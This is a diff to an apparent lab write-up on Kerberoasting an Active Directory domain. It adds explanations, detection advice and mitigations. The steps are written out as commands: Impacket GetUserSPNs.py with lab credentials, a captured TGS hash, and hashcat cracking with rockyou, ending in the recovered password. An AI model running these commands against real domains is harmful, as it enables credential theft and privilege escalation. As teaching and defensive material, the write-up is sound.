@@ -4,7 +4,7 @@
 **Author:** ShahinSecLab  
 **Category:** Active Directory  
 **Difficulty:** Medium 
-**Tools:** Meterpreter, Incognito, Windows Access Tokens
+**Tools:** Impacket, Hashcat
 
 # Table of content
 
@@ -76,9 +76,13 @@ I already have..
 
 ## Step 1 – Find Service Accounts
 
+First step was to enumerate service accounts that have SPNs registered in Active Directory.
+For this, I used Impacket’s `GetUserSPNs.py` tool.
+
 ```bash
 GetUserSPNs.py readteambd.local/rahimkhan:Password1 -dc-ip 192.168.5.134 -request
 ```
+This command lists all service accounts and automatically requests Kerberos service tickets in a crackable format.
 
 ```
 | Part                  |                     Description                      |
@@ -108,21 +112,23 @@ ReadTeamBD-DC/SQLService.READTEAMBD.local:6011  sqlservice  CN=Group Policy Crea
 $krb5tgs$23$*sqlservice$READTEAMBD.LOCAL$ReadTeamBD-DC/SQLService.READTEAMBD.local~6011*$96f871a359f348008f60f60c2ec9c111$0661ac2eeb77cd03dbf48722c056055adcfbab......
 ```
 
-```
-Service Account: sqlservice
-SPN: SQLService.READTEAMBD.local
-Domain: READTEAMBD.local
-```
+- Service Account: sqlservice
+- SPN: SQLService.READTEAMBD.local
+- Domain: READTEAMBD.local
+
 
 ## Step 2 – Save Hash to File
 
-- save hash to `kerberoast.txt` file
+After identifying the service ticket, I saved the output into `kerberoast.txt` file for offline cracking.
 
 ```bash
 GetUserSPNs.py readteambd.local/rahimkhan:Password1 -dc-ip 192.168.5.134 -request -outputfile kerberoast.txt
 ```
+This file contains the Kerberos TGS hash required for password cracking.
 
 ## Step 3 – Crack the Ticket
+
+Next, I used Hashcat to perform offline password cracking.
 
 ```bash
 hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
@@ -148,6 +154,30 @@ Recovered Password: Mypassword123#
 <p align="center">
   <img src="/writeups/kerbersoting attack/images/step3.png" width="600">
 </p>
+
+## Why Kerberoasting is Dangerous
+
+- Works with normal domain user privileges
+- No need for administrative access
+- Entire attack happens offline after ticket capture
+- Targets service accounts, which often have weak passwords
+- Can lead to privilege escalation and domain compromise
+
+## Detection
+
+- Monitor Event ID 4769 (Kerberos Service Ticket Requests)
+- Unusual volume of ticket requests from a single user
+- Requests for multiple SPNs in a short time
+- Service ticket requests outside normal usage patterns
+
+## Mitigation
+
+- Use strong, long passwords for service accounts
+- Prefer Group Managed Service Accounts (gMSA)
+- Enforce least privilege for service accounts
+- Regularly audit accounts with SPNs
+- Restrict RC4 encryption where possible
+- Monitor Kerberos activity continuously
 
 ## Key Takeaways
 
